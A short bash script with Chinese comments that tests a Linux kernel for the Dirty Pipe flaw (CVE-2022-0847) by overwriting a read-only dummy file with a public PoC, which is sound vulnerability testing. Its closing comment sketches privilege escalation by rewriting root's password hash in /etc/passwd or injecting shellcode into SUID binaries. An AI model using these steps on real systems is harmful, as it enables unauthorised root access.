#!/usr/bin/env bash
echo '--- 内核判定（5.8+ 且 < 5.16.11/5.15.25/5.10.102 受影响）'
uname -r
echo '--- 无损验证思路（不碰 /etc/passwd）'
# 1) 造一个只读文件当靶子
printf 'AAAA\n' > /tmp/dp-target && chmod 444 /tmp/dp-target
# 2) 用公开 PoC 覆写它（改写 offset 与内容即可）
#    git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
#    ./exploit /tmp/dp-target 0 'BBBB'
# 3) cat /tmp/dp-target 变为 BBBB 且权限仍是 444 → 漏洞存在
#
# 提权用法（利用阶段，先备份）：覆写 /etc/passwd 的 root 行密码字段为已知 hash，
# 或往 SUID 二进制里注入 shellcode；完成后**立刻还原文件并重启服务**。
